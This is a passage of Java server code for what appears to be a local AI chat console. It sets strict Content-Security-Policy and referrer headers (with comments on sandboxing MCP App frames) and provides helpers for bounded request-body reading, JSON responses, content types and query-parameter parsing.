                "font-src 'self'",
                "connect-src 'self'",
                "media-src 'none'",
                "object-src 'none'",
                // 'self' rather than 'none', for MCP Apps (SEP-1865): a tool's own interface
                // is rendered in a srcdoc frame, and srcdoc is subject to frame-src. The
                // frame is sandboxed WITHOUT allow-same-origin, so it has an opaque origin
                // and can read nothing here, and it carries its own default-src 'none'. This
                // directive is what lets it exist at all; those two are what make it safe.
                "frame-src 'self'",
                "worker-src 'self'",
                "manifest-src 'self'",
                "base-uri 'none'",
                "form-action 'none'",
                "frame-ancestors 'none'"));
        exchange.getResponseHeaders().add("X-Content-Type-Options", "nosniff");
        // Nothing this console links to needs to know where the click came from, and a
        // conversation id in a Referer header is a conversation id in somebody's access log.
        exchange.getResponseHeaders().add("Referrer-Policy", "no-referrer");
    }

    private static String contentTypeOf(String resource) {
        int dot = resource.lastIndexOf('.');
        String extension = dot < 0 ? "" : resource.substring(dot + 1).toLowerCase(
                java.util.Locale.ROOT);
        return switch (extension) {
            case "html" -> "text/html; charset=utf-8";
            case "js", "mjs" -> "text/javascript; charset=utf-8";
            case "css" -> "text/css; charset=utf-8";
            case "json" -> "application/json; charset=utf-8";
            case "svg" -> "image/svg+xml";
            case "png" -> "image/png";
            case "woff2" -> "font/woff2";
            default -> "application/octet-stream";
        };
    }

    // --- plumbing --------------------------------------------------------------------

    @SuppressWarnings("unchecked")
    private static Map<String, Object> readJson(HttpExchange exchange) throws IOException {
        byte[] body = readBounded(exchange);
        return body.length == 0 ? Map.of() : JSON.readValue(body, Map.class);
    }

    /**
     * The request body, refusing anything past {@link #MAX_UPLOAD_BYTES}.
     *
     * <p>Bounded because {@code readAllBytes} on a request body is an invitation: a client
     * that keeps sending would otherwise be allowed to fill the heap. Stated as a sentence
     * rather than dropped, so a person who attached something too big is told which it was.
     */
    private static byte[] readBounded(HttpExchange exchange) throws IOException {
        try (InputStream in = exchange.getRequestBody()) {
            byte[] body = in.readNBytes(MAX_UPLOAD_BYTES + 1);
            if (body.length > MAX_UPLOAD_BYTES) {
                throw new ChatUnavailable("That is larger than this console accepts ("
                        + MAX_UPLOAD_BYTES / (1024 * 1024) + " MB).");
            }
            return body;
        }
    }

    private static void send(HttpExchange exchange, int status, Object body) throws IOException {
        byte[] payload = JSON.writeValueAsBytes(body);
        exchange.getResponseHeaders().add("Content-Type", "application/json; charset=utf-8");
        // An API response is not a page, but it carries somebody else's words and a browser
        // navigated straight at it is a document. The same policy, so there is no response
        // from this server that is not covered by one.
        harden(exchange);
        exchange.sendResponseHeaders(status, payload.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(payload);
        }
    }

    private static String decodeName(String raw) {
        try {
            return URLDecoder.decode(raw, StandardCharsets.UTF_8);
        } catch (IllegalArgumentException notEncoded) {
            return raw;
        }
    }

    private static String header(HttpExchange exchange, String name, String fallback) {
        String value = exchange.getRequestHeaders().getFirst(name);
        return value == null || value.isBlank() ? fallback : value;
    }

    private static long longParam(HttpExchange exchange, String name, long fallback) {
        String query = exchange.getRequestURI().getQuery();
        if (query == null) {
            return fallback;
        }
        for (String pair : query.split("&")) {
            int equals = pair.indexOf('=');
            if (equals > 0 && pair.substring(0, equals).equals(name)) {
                try {
                    return Long.parseLong(pair.substring(equals + 1));
                } catch (NumberFormatException notANumber) {
                    return fallback;
                }
            }
        }
        return fallback;
    }

    private static String strip(String path) {
        return path.endsWith("/") && path.length() > 1
                ? path.substring(0, path.length() - 1) : path;
    }

    private static String decode(String value) {
        return URLDecoder.decode(value, StandardCharsets.UTF_8);
    }
}
